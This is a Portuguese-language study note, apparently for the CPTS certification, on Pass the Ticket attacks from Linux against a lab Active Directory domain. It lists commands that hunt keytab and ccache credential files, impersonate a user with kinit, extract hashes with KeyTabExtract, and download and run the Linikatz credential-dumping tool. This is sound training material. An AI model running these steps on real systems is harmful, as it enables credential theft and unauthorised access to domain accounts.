> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/pass-the-ticket-ptt-from-linux.md).

# Pass the Ticket (PtT) from Linux

* **realm - Verificar se a máquina Linux está ingressada em um domínio**

```
realm list
```

* **PS - Verifique se a máquina Linux está ingressada no domínio**

```
ps -ef | grep -i "winbind\|sssd"
```

* **Usando a função `find` para procurar arquivos com "keytab" no nome**

```
find / -name *keytab* -ls 2>/dev/null
```

* **Identificando arquivos KeyTab em tarefas Cron**

```
crontab -l
```

* **Analisando as variáveis ​​de ambiente para arquivos ccache**

```
env | grep -i krb5
```

* **Procurando arquivos ccache em /tmp**

```
ls -la /tmp
```

* **Informações do arquivo KeyTab da lista**

```
klist -k -t /opt/specialfiles/carlos.keytab
```

* **Representando um usuário com um KeyTab**

```
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

* Podemos tentar acessar a pasta compartilhada `\\dc01\carlos`para confirmar nosso acesso.

```
smbclient //dc01/carlos -k -c ls
```

* **Extraindo hashes de KeyTab com KeyTabExtract**

```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

**Download e execução do Linikatz**

* [O Linikatz](https://github.com/CiscoCXSecurity/linikatz) é uma ferramenta criada pela equipe de segurança da Cisco para explorar credenciais em máquinas Linux quando há integração com o Active Directory. Em outras palavras, o Linikatz aplica um princípio semelhante em `Mimikatz`ambientes UNIX.

{% code lineNumbers="true" %}

```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```

{% endcode %}
